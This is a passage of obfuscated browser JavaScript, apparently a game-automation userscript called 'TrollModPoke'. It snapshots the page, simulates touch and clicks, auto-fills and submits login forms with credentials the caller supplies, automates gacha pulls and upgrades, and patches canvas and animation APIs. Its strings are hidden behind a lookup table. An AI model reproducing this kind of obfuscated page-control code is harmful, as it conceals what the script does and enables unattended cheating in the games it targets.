                continue;
            }
            var bg = cs.backgroundColor, hasBg = bg && bg !== _0xstr(0xa) && !/rgba\(.*,\s*0\)$/.test(bg);
            var bw = parseFloat(cs.borderTopWidth) || 0, hasBd = bw > 0 && cs.borderTopStyle !== _0xstr(0xb);
            var rad = parseFloat(cs.borderTopLeftRadius) || 0;
            if (tag === _0xstr(0xc) || tag === _0xstr(0xd) || tag === _0xstr(0xe) || tag === _0xstr(0xf)) {
                out.push({ t: _0xstr(0x10), r: r, rad: rad });
                n++;
            }
            else if (hasBg || hasBd || tag === _0xstr(0x11) || tag === _0xstr(0x12) || tag === _0xstr(0x13) || tag === _0xstr(0x14)) {
                out.push({ t: _0xstr(0x15), r: r, rad: rad, bg: hasBg ? bg : null, bd: hasBd ? cs.borderTopColor : (tag === _0xstr(0x16) || tag === _0xstr(0x17) || tag === _0xstr(0x18) ? _0xstr(0x19) : null) });
                n++;
            }
            var txt = '';
            for (var c = el.firstChild; c; c = c.nextSibling)
                if (c.nodeType === 3)
                    txt += c.nodeValue;
            txt = txt.replace(/\s+/g, _0xstr(0x1a)).trim();
            if (!txt && (tag === _0xstr(0x1b) || tag === _0xstr(0x1c)))
                txt = (el.value || el.placeholder || '').trim();
            if (txt) {
                var fs = parseFloat(cs.fontSize) || 12, lh = parseFloat(cs.lineHeight) || fs * 1.25;
                var lines = Math.max(1, Math.min(6, Math.round(r.height / lh)));
                var wpx = Math.min(r.width, txt.length * fs * 0.52 / lines + fs);
                out.push({ t: _0xstr(0x1d), x: r.left + (tag === _0xstr(0x1e) || cs.textAlign === _0xstr(0x1f) ? (r.width - wpx) / 2 : 0), y: r.top, w: wpx, lines: lines, lh: lh, fs: fs, col: cs.color });
                n++;
            }
        }
        return out;
    }
    function rr(ctx, x, y, w, h, rad) {
        if (rad > 1 && ctx.roundRect) {
            ctx.beginPath();
            ctx.roundRect(x, y, w, h, Math.min(rad, w / 2, h / 2));
            return true;
        }
        return false;
    }
    function gameCanvas() {
        return document.getElementById(_0xstr(0x20)) || document.querySelector(_0xstr(0x21)) ||
            document.querySelector(_0xstr(0x22));
    }
    function drawCanvas(c, r, k) {
        try {
            nativeDraw.call(g, c, r.left * k, r.top * k, r.width * k, r.height * k);
        }
        catch (e) { }
    }
    function posterize() {
        try {
            var im = g.getImageData(0, 0, cv.width, cv.height), d = im.data;
            for (var i = 0; i < d.length; i += 4) {
                d[i] = (d[i] + 32) >> 6 << 6;
                d[i + 1] = (d[i + 1] + 32) >> 6 << 6;
                d[i + 2] = (d[i + 2] + 32) >> 6 << 6;
            }
            g.putImageData(im, 0, 0);
        }
        catch (e) { }
    }
    function render() {
        if (!cv) {
            cv = document.createElement(_0xstr(0x23));
            cv.setAttribute(_0xstr(0x24), '');
            g = cv.getContext(_0xstr(0x25));
        }
        var W = PW, H = Math.max(30, Math.round(PW * innerHeight / Math.max(1, innerWidth)));
        if (cv.width !== W || cv.height !== H) {
            cv.width = W;
            cv.height = H;
        }
        var k = W / Math.max(1, innerWidth);
        g.globalAlpha = 1;
        g.fillStyle = (getComputedStyle(document.body).backgroundColor || _0xstr(0x26));
        if (g.fillStyle === _0xstr(0x27))
            g.fillStyle = _0xstr(0x28);
        g.fillRect(0, 0, W, H);
        g.imageSmoothingEnabled = cfg.style !== _0xstr(0x29);
        if (cfg.mode === _0xstr(0x2a)) {
            var gc = gameCanvas();
            if (gc) {
                var r0 = gc.getBoundingClientRect();
                drawCanvas(gc, r0, k);
            }
        }
        else {
            var now = performance.now();
            if (now - itemsAt > 450) {
                items = scan();
                itemsAt = now;
            }
            for (var i = 0; i < items.length; i++) {
                var it = items[i];
                if (it.t === _0xstr(0x2b)) {
                    drawCanvas(it.el, it.el.getBoundingClientRect(), k);
                    continue;
                }
                if (it.t === _0xstr(0x2c)) {
                    g.fillStyle = it.col;
                    g.globalAlpha = 0.85;
                    var bh = Math.max(1, it.fs * 0.55 * k);
                    for (var l = 0; l < it.lines; l++) {
                        var ww = l === it.lines - 1 && it.lines > 1 ? it.w * 0.6 : it.w;
                        g.fillRect(it.x * k, (it.y + l * it.lh + (it.lh - it.fs * 0.55) / 2) * k, Math.max(1, ww * k), bh);
                    }
                    g.globalAlpha = 1;
                    continue;
                }
                var x = it.r.left * k, y = it.r.top * k, w = it.r.width * k, h = it.r.height * k;
                if (it.t === _0xstr(0x2d)) {
                    g.fillStyle = _0xstr(0x2e);
                    g.strokeStyle = _0xstr(0x2f);
                    if (!rr(g, x, y, w, h, it.rad * k)) {
                        g.beginPath();
                        g.rect(x, y, w, h);
                    }
                    g.fill();
                    g.stroke();
                    continue;
                }
                if (it.bg) {
                    g.fillStyle = it.bg;
                    if (!rr(g, x, y, w, h, it.rad * k)) {
                        g.beginPath();
                        g.rect(x, y, w, h);
                    }
                    g.fill();
                }
                if (it.bd) {
                    g.strokeStyle = it.bd;
                    if (!rr(g, x, y, w, h, it.rad * k)) {
                        g.beginPath();
                        g.rect(x, y, w, h);
                    }
                    g.stroke();
                }
            }
        }
        if (cfg.style === _0xstr(0x30))
            posterize();
    }
    function snap(w) {
        if (!document.body)
            return null;
        PW = Math.max(120, Math.min(1280, w | 0 || 420));
        render();
        return cv.toDataURL(cfg.style === _0xstr(0x31) ? _0xstr(0x32) : _0xstr(0x33), 0.6);
    }
    var tch = null, tid = 0;
    function ptrEv(type, x, y, id, down) {
        return new PointerEvent(type, { bubbles: true, cancelable: true, composed: true, view: window,
            clientX: x, clientY: y, screenX: x, screenY: y, pointerId: 100 + id, pointerType: _0xstr(0x34), isPrimary: true,
            width: 1, height: 1, pressure: down ? 0.5 : 0, button: type === _0xstr(0x35) ? -1 : 0, buttons: down ? 1 : 0 });
    }
    function touchEv(type, x, y, id, target) {
        var t = new Touch({ identifier: id, target: target, clientX: x, clientY: y, pageX: x + scrollX, pageY: y + scrollY, screenX: x, screenY: y });
        var end = type === _0xstr(0x36) || type === _0xstr(0x37);
        return new TouchEvent(type, { bubbles: true, cancelable: true, composed: true, view: window,
            touches: end ? [] : [t], targetTouches: end ? [] : [t], changedTouches: [t] });
    }
    function mouseEv(type, x, y, down) {
        return new MouseEvent(type, { bubbles: true, cancelable: true, composed: true, view: window,
            clientX: x, clientY: y, screenX: x, screenY: y, button: 0, buttons: down ? 1 : 0 });
    }
    function send(el, mk) { try {
        el.dispatchEvent(mk());
    }
    catch (e) { } }
    function touch(phase, nx, ny) {
        var x = Math.round(Math.max(0, Math.min(1, nx)) * (innerWidth - 1));
        var y = Math.round(Math.max(0, Math.min(1, ny)) * (innerHeight - 1));
        if (phase === _0xstr(0x38)) {
            var el = document.elementFromPoint(x, y) || document.body;
            tch = { el: el, x: x, y: y, moved: false, id: ++tid };
            send(el, function () { return ptrEv(_0xstr(0x39), x, y, tch.id, true); });
            send(el, function () { return touchEv(_0xstr(0x3a), x, y, tch.id, el); });
            return;
        }
        if (!tch)
            return;
        var s = tch, t = s.el;
        if (phase === _0xstr(0x3b)) {
            if (Math.abs(x - s.x) + Math.abs(y - s.y) > 12)
                s.moved = true;
            send(t, function () { return ptrEv(_0xstr(0x3c), x, y, s.id, true); });
            send(t, function () { return touchEv(_0xstr(0x3d), x, y, s.id, t); });
            return;
        }
        var cancel = phase === _0xstr(0x3e);
        send(t, function () { return ptrEv(cancel ? _0xstr(0x3f) : _0xstr(0x40), x, y, s.id, false); });
        send(t, function () { return touchEv(cancel ? _0xstr(0x41) : _0xstr(0x42), x, y, s.id, t); });
        if (!cancel && !s.moved) {
            send(t, function () { return mouseEv(_0xstr(0x43), x, y, false); });
            send(t, function () { return mouseEv(_0xstr(0x44), x, y, true); });
            if (/^(INPUT|TEXTAREA|SELECT)$/.test(t.tagName)) {
                try {
                    t.focus();
                }
                catch (e) { }
            }
            send(t, function () { return mouseEv(_0xstr(0x45), x, y, false); });
            send(t, function () { return mouseEv(_0xstr(0x46), x, y, false); });
        }
        tch = null;
    }
    var loginStatus = '', autoDone = false;
    function vis(el) {
        var r = el.getBoundingClientRect();
        if (r.width < 2 || r.height < 2)
            return false;
        var cs = getComputedStyle(el);
        return cs.visibility !== _0xstr(0x47) && cs.display !== _0xstr(0x48) && cs.opacity !== _0xstr(0x49);
    }
    function setVal(el, v) {
        var proto = el.tagName === _0xstr(0x4a) ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
        var d = Object.getOwnPropertyDescriptor(proto, _0xstr(0x4b));
        try {
            el.focus();
        }
        catch (e) { }
        if (d && d.set)
            d.set.call(el, v);
        else
            el.value = v;
        el.dispatchEvent(new Event(_0xstr(0x4c), { bubbles: true }));
        el.dispatchEvent(new Event(_0xstr(0x4d), { bubbles: true }));
    }
    var TXT = /^(text|email|tel|search|url|)$/i;
    function plain(s) { return String(s || '').normalize(_0xstr(0x4e)).replace(/[\u0300-\u036f]/g, '').replace(/[đĐ]/g, _0xstr(0x4f)).toLowerCase(); }
    var USER_RE = /user|email|mail|login|account|tai.?khoan|ten/;
    function findFields() {
        var all = [].slice.call(document.querySelectorAll(_0xstr(0x50))).filter(function (i) { return vis(i) && !i.disabled && !i.readOnly; });
        var pw = null, k;
        for (k = 0; k < all.length; k++)
            if (all[k].type === _0xstr(0x51)) {
                pw = all[k];
                break;
            }
        if (!pw)
            return null;
        var before = null;
        for (k = all.indexOf(pw) - 1; k >= 0; k--)
            if (TXT.test(all[k].type || '')) {
                before = all[k];
                break;
            }
        var named = all.filter(function (i) {
            return i !== pw && TXT.test(i.type || '') && (!pw.form || i.form === pw.form) &&
                USER_RE.test(plain((i.name || '') + _0xstr(0x52) + (i.id || '') + _0xstr(0x53) + (i.autocomplete || '') + _0xstr(0x54) + (i.placeholder || '')));
        })[0];
        return { pw: pw, user: named || before };
    }
    var GO_RE = /log\s*in|sign\s*in|dang\s*nhap|submit|continue|tiep\s*tuc|vao|enter|play/;
    var BAD_RE = /google|facebook|apple|discord|github|register|sign\s*up|dang\s*ky|guest|khach|forgot|quen/;
    function btnText(b) { return plain((b.innerText || b.value || b.getAttribute(_0xstr(0x55)) || '').replace(/\s+/g, _0xstr(0x56)).trim()); }
    function submit(pw) {
        var node = pw.form || pw.parentElement, hops = 0, pick = null;
        while (node && !pick && hops++ < 6) {
            var bs = [].slice.call(node.querySelectorAll(_0xstr(0x57)))
                .filter(function (b) { return vis(b) && !b.disabled && !BAD_RE.test(btnText(b)); });
            pick = bs.filter(function (b) { return b.type === _0xstr(0x58); })[0] || bs.filter(function (b) { return GO_RE.test(btnText(b)); })[0] || null;
            node = node.parentElement;
        }
        if (pick) {
            pick.click();
            return;
        }
        if (pw.form) {
            try {
                pw.form.requestSubmit();
            }
            catch (e) {
                pw.form.submit();
            }
            return;
        }
        [_0xstr(0x59), _0xstr(0x5a), _0xstr(0x5b)].forEach(function (t) {
            pw.dispatchEvent(new KeyboardEvent(t, { key: _0xstr(0x5c), code: _0xstr(0x5d), keyCode: 13, which: 13, bubbles: true, cancelable: true }));
        });
    }
    function clickOpener() {
        var c = [].slice.call(document.querySelectorAll(_0xstr(0x5e))).filter(function (b) {
            return vis(b) && /^(log\s*in|sign\s*in|dang\s*nhap)$/.test(btnText(b));
        })[0];
        if (c)
            c.click();
    }
    function attempt(u, p, timeout, allowOpen) {
        var t0 = Date.now(), opened = false;
        loginStatus = _0xstr(0x5f);
        (function step() {
            var f = null;
            try {
                f = findFields();
            }
            catch (e) { }
            if (f) {
                try {
                    if (f.user)
                        setVal(f.user, u);
                    setVal(f.pw, p);
                    loginStatus = f.user ? _0xstr(0x60) : _0xstr(0x61);
                    setTimeout(function () {
                        try {
                            submit(f.pw);
                        }
                        catch (e) {
                            loginStatus = _0xstr(0x62);
                        }
                    }, 250);
                }
                catch (e) {
                    loginStatus = _0xstr(0x63) + e.message;
                }
                return;
            }
            var el = Date.now() - t0;
            if (allowOpen && !opened && el > 800) {
                opened = true;
                try {
                    clickOpener();
                }
                catch (e) { }
            }
            if (el > timeout) {
                loginStatus = _0xstr(0x64);
                return;
            }
            setTimeout(step, 300);
        })();
    }
    var CLICKABLE = _0xstr(0x65);
    var OPT = window.__TT_OPT || {};
    var gstatus = '';
    function lab(el) { return plain((el.innerText || el.value || el.getAttribute(_0xstr(0x66)) || el.title || '').replace(/\s+/g, _0xstr(0x67)).trim()); }
    function idsOf(el) {
        return plain([el.id, el.getAttribute(_0xstr(0x68)), el.getAttribute(_0xstr(0x69)), el.getAttribute(_0xstr(0x6a)), el.getAttribute(_0xstr(0x6b))].join(_0xstr(0x6c)));
    }
    function clickables() {
        return [].slice.call(document.querySelectorAll(CLICKABLE)).filter(function (e) {
            return vis(e) && !e.closest(_0xstr(0x6d));
        });
    }
    function isEnabled(e) {
        return !e.disabled && e.getAttribute(_0xstr(0x6e)) !== _0xstr(0x6f) && !/(^|\s)(disabled|locked|maxed)(\s|$)/i.test(String(e.className || ''));
    }
    function realClick(el) {
        try {
            el.scrollIntoView({ block: _0xstr(0x70) });
        }
        catch (e) { }
        var r = el.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2;
        var mk = function (T, t) { return new T(t, { bubbles: true, cancelable: true, composed: true, view: window, clientX: x, clientY: y, button: 0 }); };
        try {
            el.dispatchEvent(mk(PointerEvent, _0xstr(0x71)));
            el.dispatchEvent(mk(MouseEvent, _0xstr(0x72)));
        }
        catch (e) { }
        try {
            el.dispatchEvent(mk(PointerEvent, _0xstr(0x73)));
            el.dispatchEvent(mk(MouseEvent, _0xstr(0x74)));
        }
        catch (e) { }
        el.click();
    }
    var KIND = {
        gacha: /gacha|banner|summon|invoc|ruleta|vong quay|quay so|rut the/,
        shop: /shop|tienda|kecleon|mart|store|cua hang|market/,
        upgrade: /upgrade|mejora|nang cap|talent|perk|power.?up/
    };
    function openKind(kind) {
        var re = KIND[kind], cs = clickables(), pick = null;
        pick = cs.filter(function (e) { var g = plain(e.getAttribute(_0xstr(0x75)) || ''); return g && re.test(g); })[0] ||
            cs.filter(function (e) { return re.test(idsOf(e)) && lab(e).length < 40; })[0] ||
            cs.filter(function (e) { var l = lab(e); return l && l.length < 28 && re.test(l); })[0];
        if (!pick)
            return false;
        realClick(pick);
        return true;
    }
    var ROMAN = ['', _0xstr(0x76), _0xstr(0x77), _0xstr(0x78), _0xstr(0x79), _0xstr(0x7a), _0xstr(0x7b), _0xstr(0x7c), _0xstr(0x7d), _0xstr(0x7e)];
    var REGION = ['', _0xstr(0x7f), _0xstr(0x80), _0xstr(0x81), _0xstr(0x82), _0xstr(0x83), _0xstr(0x84), _0xstr(0x85), _0xstr(0x86), _0xstr(0x87)];
    function pickGen(n) {
        var cs = clickables(), pick = null, sn = String(n);
        pick = cs.filter(function (e) { return e.getAttribute(_0xstr(0x88)) === sn; })[0] ||
            cs.filter(function (e) { return new RegExp(_0xstr(0x89) + sn + _0xstr(0x8a) + ROMAN[n] + _0xstr(0x8b)).test(lab(e)); })[0] ||
            cs.filter(function (e) { return new RegExp(_0xstr(0x8c) + REGION[n] + _0xstr(0x8d)).test(lab(e)); })[0] ||
            cs.filter(function (e) {
                if (lab(e) !== sn)
                    return false;
                var par = e.parentElement;
                if (!par)
                    return false;
                var nums = [].slice.call(par.children).filter(function (c) { return /^[1-9]$/.test(lab(c)); });
                return nums.length >= 3;
            })[0];
        if (!pick)
            return false;
        realClick(pick);
        return true;
    }
    var BAD_PULL = /close|back|volver|cerrar|dong|quay lai|skip|bo qua|info|rate|tasa|history|historial|lich su|cancel|huy|ok$/;
    function findPull(count) {
        var cs = clickables().filter(function (e) {
            var l = lab(e), i = idsOf(e);
            if (e.hasAttribute(_0xstr(0x8e)) || e.closest(_0xstr(0x8f)))
                return false;
            return !BAD_PULL.test(l) && (/pull|roll|summon|tirar|invoc|quay|rut|spin|draw|abrir|open/.test(l + _0xstr(0x90) + i)) && l.length < 40;
        });
        var ten = cs.filter(function (e) { return /(^|[^0-9])10([^0-9]|$)|x ?10|ten|multi/.test(lab(e) + _0xstr(0x91) + idsOf(e)); });
        var one = cs.filter(function (e) { return ten.indexOf(e) < 0; });
        return (count >= 10 ? ten[0] || one[0] : one[0] || ten[0]) || null;
    }
    var OK_RE = /^(ok|okay|continue|aceptar|got it|claim|collect|nhan|tiep tuc|xong|done|great|awesome|tuyet|next|siguiente)\b/;
    var CLOSE_RE = /^(close|cerrar|dong|skip|bo qua|x|✕|×)$/;
    var POPUP_SEL = _0xstr(0x92);
    function dismissPopup() {
        var cs = clickables().filter(isEnabled);
        var d = cs.filter(function (e) { return OK_RE.test(lab(e)); }).pop() ||
            cs.filter(function (e) { return CLOSE_RE.test(lab(e)) && e.closest(POPUP_SEL); }).pop();
        if (d) {
            realClick(d);
            return true;
        }
        return false;
    }
    function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
    var busy = false;
    function pauseBot() { var b = window.PSBot && PSBot.state; if (b && b.on) {
        try {
            PSBot.pause();
        }
        catch (e) { }
        return true;
    } return false; }
    function resumeBot(was) { if (was) {
        try {
            PSBot.resume();
        }
        catch (e) { }
    } }
    function gachaRun(gen, times, count) {
        if (busy)
            return _0xstr(0x93);
        busy = true;
        gstatus = _0xstr(0x94);
        var was = pauseBot();
        (async function () {
            try {
                if (!findPull(count)) {
                    if (!openKind(_0xstr(0x95))) {
                        gstatus = _0xstr(0x96);
                        return;
                    }
                    await wait(900);
                }
                if (gen) {
                    if (pickGen(gen)) {
                        gstatus = _0xstr(0x97) + gen;
                        await wait(700);
                    }
                    else {
                        gstatus = _0xstr(0x98) + gen + _0xstr(0x99);
                        await wait(400);
                    }
                }
                var done = 0;
                for (var i = 0; i < times; i++) {
                    var b = findPull(count);
                    if (!b) {
                        gstatus = _0xstr(0x9a) + done + _0xstr(0x9b);
                        return;
                    }
                    if (!isEnabled(b)) {
                        gstatus = _0xstr(0x9c) + done + _0xstr(0x9d);
                        return;
                    }
                    realClick(b);
                    done++;
                    gstatus = _0xstr(0x9e) + done + _0xstr(0x9f) + times;
                    await wait(1300);
                    for (var k = 0; k < 4 && dismissPopup(); k++)
                        await wait(500);
                }
                gstatus = _0xstr(0xa0) + done + _0xstr(0xa1) + (gen ? _0xstr(0xa2) + gen + _0xstr(0xa3) : '');
            }
            catch (e) {
                gstatus = _0xstr(0xa4) + e.message;
            }
            finally {
                busy = false;
                resumeBot(was);
            }
        })();
        return _0xstr(0xa5);
    }
    var UP_BTN = /^\+$|^\+ ?\d|upgrade|nang cap|mejorar|subir|level ?up|^add\b|^cong\b|^tang\b|^mua\b|^buy\b|^comprar/;
    var UP_BAD = /max|locked|close|back|volver|cerrar|dong|quay lai|cancel|huy|shop|gacha|play|choi/;
    function upgradeRun(auto) {
        if (busy)
            return _0xstr(0xa6);
        busy = true;
        gstatus = _0xstr(0xa7);
        var was = pauseBot();
        (async function () {
            var clicks = 0;
            try {
                if (!openKind(_0xstr(0xa8))) {
                    gstatus = _0xstr(0xa9);
                    return;
                }
                await wait(900);
                for (var i = 0; i < 80; i++) {
                    var b = clickables().filter(function (e) { var l = lab(e); return UP_BTN.test(l) && !UP_BAD.test(l) && isEnabled(e); })[0];
                    if (!b)
                        break;
                    realClick(b);
                    clicks++;
                    await wait(200);
                    var cf = clickables().filter(function (e) { return /^(ok|aceptar|confirm|confirmar|xac nhan|yes)\b/.test(lab(e)); })[0];
                    if (cf)
                        realClick(cf);
                }
                gstatus = clicks ? _0xstr(0xaa) + clicks + _0xstr(0xab) : _0xstr(0xac);
                var back = clickables().filter(function (e) { return /^(close|back|volver|cerrar|dong|quay lai|x|✕|×)$/.test(lab(e)); })[0];
                if (back) {
                    realClick(back);
                    await wait(500);
                }
            }
            catch (e) {
                gstatus = _0xstr(0xad) + e.message;
            }
            finally {
                busy = false;
                resumeBot(was);
            }
        })();
        return _0xstr(0xae);
    }
    function openShop() { var ok = openKind(_0xstr(0xaf)); gstatus = ok ? _0xstr(0xb0) : _0xstr(0xb1); return ok; }
    function scanUi() {
        var out = [], scr = [].slice.call(document.querySelectorAll(_0xstr(0xb2))).filter(function (e) { return !e.classList.contains(_0xstr(0xb3)) && vis(e); });
        out.push(_0xstr(0xb4) + location.href);
        out.push(_0xstr(0xb5) + (scr.map(function (e) { return (e.id || e.className || e.tagName); }).join(_0xstr(0xb6)) || _0xstr(0xb7)));
        var seen = {};
        clickables().slice(0, 140).forEach(function (e) {
            var l = (e.innerText || e.value || e.getAttribute(_0xstr(0xb8)) || e.title || '').replace(/\s+/g, _0xstr(0xb9)).trim().slice(0, 40);
            var line = e.tagName.toLowerCase() + (e.id ? _0xstr(0xba) + e.id : '') + (e.getAttribute(_0xstr(0xbb)) ? _0xstr(0xbc) + e.getAttribute(_0xstr(0xbd)) + _0xstr(0xbe) : '') + (e.getAttribute(_0xstr(0xbf)) ? _0xstr(0xc0) + e.getAttribute(_0xstr(0xc1)) + _0xstr(0xc2) : '') + (isEnabled(e) ? '' : _0xstr(0xc3)) + _0xstr(0xc4) + l + _0xstr(0xc5);
            if (!seen[line]) {
                seen[line] = 1;
                out.push(line);
            }
        });
        return out.join(_0xstr(0xc6));
    }
    var wd = { since: 0, lastAct: 0, saveAt: 0, upDone: false };
    var POPUPS = [[_0xstr(0xc7), _0xstr(0xc8)], [_0xstr(0xc9), _0xstr(0xca)], [_0xstr(0xcb), _0xstr(0xcc)], [_0xstr(0xcd), _0xstr(0xce)], [_0xstr(0xcf), _0xstr(0xd0)]];
    function screenOpen(id) { var e = document.getElementById(id); return !!e && !e.classList.contains(_0xstr(0xd1)) && vis(e); }
    function watchdog() {
        var st = window.PSBot && PSBot.state;
        if (!st || !st.on || busy) {
            wd.since = 0;
            return;
        }
        if (st.target && st.done >= st.target)
            return;
        var over = screenOpen(_0xstr(0xd2)), menu = screenOpen(_0xstr(0xd3)), now = Date.now();
        if (!over && !menu) {
            wd.since = 0;
            wd.saveAt = 0;
            wd.upDone = false;
            return;
        }
        if (!wd.since)
            wd.since = now;
        if (now - wd.since < 9000 || now - wd.lastAct < 2500)
            return;
        for (var i = 0; i < POPUPS.length; i++) {
            if (screenOpen(POPUPS[i][0])) {
                var pb = document.getElementById(POPUPS[i][1]);
                if (pb) {
                    realClick(pb);
                    wd.lastAct = now;
                    gstatus = _0xstr(0xd4) + POPUPS[i][0];
                    return;
                }
            }
        }
        var sb = document.getElementById(_0xstr(0xd5));
        if (sb && !sb.classList.contains(_0xstr(0xd6)) && vis(sb) && !sb.disabled) {
            if (!wd.saveAt) {
                realClick(sb);
                wd.saveAt = now;
                wd.lastAct = now;
                gstatus = _0xstr(0xd7);
                return;
            }
            if (now - wd.saveAt < 15000)
                return;
        }
        if (menu && OPT.autoUpgrade && !wd.upDone) {
            wd.upDone = true;
            wd.lastAct = now;
            upgradeRun(true);
            return;
        }
        var go = over ? document.getElementById(_0xstr(0xd8)) : document.querySelector(_0xstr(0xd9));
        if (go) {
            realClick(go);
            wd.lastAct = now;
            wd.since = 0;
            wd.saveAt = 0;
            gstatus = _0xstr(0xda);
        }
    }
    setInterval(function () { try {
        watchdog();
    }
    catch (e) { } }, 1500);
    mergeCfg(window.__TT_MINI);
    window.__TT = {
        hide: function (b) { window.__TT_HIDE = !!b; apply(); },
        mini: {
            set: function (o) { mergeCfg(o); itemsAt = -1e9; },
            get: function () { return JSON.parse(JSON.stringify(cfg)); },
            snap: snap,
            touch: touch
        },
        game: {
            gacha: gachaRun,
            upgrade: function () { return upgradeRun(false); },
            openShop: openShop,
            open: function (k) { return openKind(k); },
            scan: scanUi,
            setOpt: function (o) { for (var k in o)
                OPT[k] = o[k]; },
            get status() { return gstatus; }
        },
        login: function (u, p) { attempt(String(u), String(p), 8000, true); return _0xstr(0xdb); },
        autoLogin: function (u, p) { if (autoDone)
            return _0xstr(0xdc); autoDone = true; attempt(String(u), String(p), 20000, false); return _0xstr(0xdd); },
        get loginStatus() { return loginStatus; }
    };
    apply();
    document.addEventListener(_0xstr(0xde), apply);
})();
function psbotMain() {
    const V = _0xstr(0xdf);
    const site = /doofcraft/i.test(location.hostname) ? _0xstr(0xe0) : _0xstr(0xe1);
    const SITES = { "default": { "start": [_0xstr(0xe2), _0xstr(0xe3)], "idle": [_0xstr(0xe4), _0xstr(0xe5), _0xstr(0xe6), _0xstr(0xe7), _0xstr(0xe8), _0xstr(0xe9)] }, "doofcraft": { "start": [_0xstr(0xea)], "idle": [_0xstr(0xeb), _0xstr(0xec), _0xstr(0xed), _0xstr(0xee)] } };
    const status = msg => {
        let el = document.getElementById(_0xstr(0xef));
        if (!el) {
            el = document.createElement(_0xstr(0xf0));
            el.id = _0xstr(0xf1);
            el.style.cssText = _0xstr(0xf2);
            document.documentElement.append(el);
        }
        el.textContent = `TrollModPoke v${V}: ${msg}`;
    };
    const FILES = {
        "core/lite.js": () => {
            (() => {
                if (window.PSLite)
                    return;
                const KEY = _0xstr(0xf3);
                const DEF = { dpr: 0, shadow: false, glow: false, part: false, css: false, pixel: false, skip: 1, fps: 0, hide: 0, bg: false };
                const PRESETS = {
                    off: { ...DEF },
                    light: { ...DEF, dpr: 1, shadow: true, glow: true, css: true, pixel: true },
                    strong: { ...DEF, dpr: 0.75, shadow: true, glow: true, part: true, css: true, pixel: true, skip: 2, hide: 1 },
                    max: { ...DEF, dpr: 0.5, shadow: true, glow: true, part: true, css: true, pixel: true, skip: 3, hide: 2, bg: true },
                };
                const cfg = { ...DEF };
                try {
                    const saved = JSON.parse(localStorage.getItem(KEY) || _0xstr(0xf4));
                    for (const k in DEF)
                        if (k in saved && typeof saved[k] === typeof DEF[k])
                            cfg[k] = saved[k];
                }
                catch { }
                const save = () => { try {
                    localStorage.setItem(KEY, JSON.stringify(cfg));
                }
                catch { } };
                const dprDesc = Object.getOwnPropertyDescriptor(window, _0xstr(0xf5));
                const nativeDpr = () => { try {
                    return (dprDesc && dprDesc.get ? dprDesc.get.call(window) : dprDesc && dprDesc.value) || 1;
                }
                catch {
                    return 1;
                } };
                try {
                    Object.defineProperty(window, _0xstr(0xf6), {
                        configurable: true,
                        enumerable: true,
                        get: () => (cfg.dpr > 0 ? Math.min(cfg.dpr, nativeDpr()) : nativeDpr()),
                    });
                }
                catch { }
                const P = window.CanvasRenderingContext2D && CanvasRenderingContext2D.prototype;
                const force = (name, value, on) => {
                    const d = P && Object.getOwnPropertyDescriptor(P, name);
                    if (!d || !d.set || !d.configurable)
                        return;
                    Object.defineProperty(P, name, { ...d, set(v) { d.set.call(this, on() ? value : v); } });
                };
                force(_0xstr(0xf7), 0, () => cfg.shadow);
                force(_0xstr(0xf8), _0xstr(0xf9), () => cfg.shadow);
                force(_0xstr(0xfa), _0xstr(0xfb), () => cfg.shadow);
                force(_0xstr(0xfc), false, () => cfg.pixel);
                force(_0xstr(0xfd), _0xstr(0xfe), () => cfg.pixel);
                let main = null;
                const isMain = ctx => {
                    const c = ctx.canvas;
                    if (c === main)
                        return true;
                    if (c && c.isConnected && c.width >= 320 && c.height >= 240) {
                        main = c;
                        return true;
                    }
                    return false;
                };
                let open = true;
                const radial = new WeakSet();
                if (P && P.createRadialGradient) {
                    const o = P.createRadialGradient;
                    P.createRadialGradient = function () { const g = o.apply(this, arguments); radial.add(g); return g; };
                }
                const NUM = /^[+\-]?\d[\d.,]{0,5}[kKmM]?!?$/;
                const tiny = (ctx, w, h) => { const s = Math.abs(ctx.getTransform().a) || 1; return Math.abs(w * h) * s * s < 64; };
                const rawFillRect = P && P.fillRect;
                const flat = (ctx, a) => {
                    const n = a.length, w = n >= 9 ? a[7] : n >= 5 ? a[3] : a[0].width, h = n >= 9 ? a[8] : n >= 5 ? a[4] : a[0].height;
                    const x = n >= 9 ? a[5] : a[1], y = n >= 9 ? a[6] : a[2];
                    const fs = ctx.fillStyle, ga = ctx.globalAlpha, go = ctx.globalCompositeOperation;
                    ctx.fillStyle = _0xstr(0xff);
                    ctx.globalAlpha = 1;
                    ctx.globalCompositeOperation = _0xstr(0x100);
                    rawFillRect.call(ctx, x - 1, y - 1, w + 2, h + 2);
                    ctx.fillStyle = fs;
                    ctx.globalAlpha = ga;
                    ctx.globalCompositeOperation = go;
                    return true;
                };
                const drop = (ctx, name, a) => {
                    if (!isMain(ctx))
                        return false;
                    if (!open)
                        return true;
                    if (cfg.glow && (ctx.globalCompositeOperation === _0xstr(0x101) || (name !== _0xstr(0x102) && radial.has(ctx.fillStyle))))
                        return true;
                    if (cfg.part) {
                        if (name === _0xstr(0x103) || name === _0xstr(0x104)) {
                            if (NUM.test(String(a[0]).trim())) {
                                const m = ctx.getTransform();
                                if (m.e !== 0 || m.f !== 0)
                                    return true;
                            }
                        }
                        else if (name === _0xstr(0x105) && ctx.globalAlpha < 0.9 && tiny(ctx, a[2], a[3]))
                            return true;
                    }
                    if (cfg.bg && name === _0xstr(0x106)) {
                        const i = a[0];
                        if (i && i.width === 256 && i.height === 256 && i.getContext)
                            return flat(ctx, a);
                    }
                    return false;
                };
                const active = () => !open || cfg.glow || cfg.part || cfg.bg;
                if (P)
                    [_0xstr(0x107), _0xstr(0x108), _0xstr(0x109), _0xstr(0x10a), _0xstr(0x10b), _0xstr(0x10c), _0xstr(0x10d), _0xstr(0x10e)].forEach(name => {
                        const o = P[name];
                        if (typeof o !== _0xstr(0x10f))
                            return;
                        P[name] = function () { return active() && drop(this, name, arguments) ? undefined : o.apply(this, arguments); };
                    });
                const nativeRAF = window.requestAnimationFrame, nativeCAF = window.cancelAnimationFrame;
                const later = new Map();
                let seq = 1e9, allowedT = -1, lastT = -1e9, frameT = -1, frameNo = 0;
                const mark = t => { if (t !== frameT) {
                    frameT = t;
                    frameNo++;
                    open = cfg.skip <= 1 || frameNo % cfg.skip === 0;
                } };
                window.requestAnimationFrame = function (cb) {
                    if (!cfg.fps)
                        return nativeRAF.call(window, cfg.skip > 1 ? t => { mark(t); return cb(t); } : cb);
                    const id = ++seq;
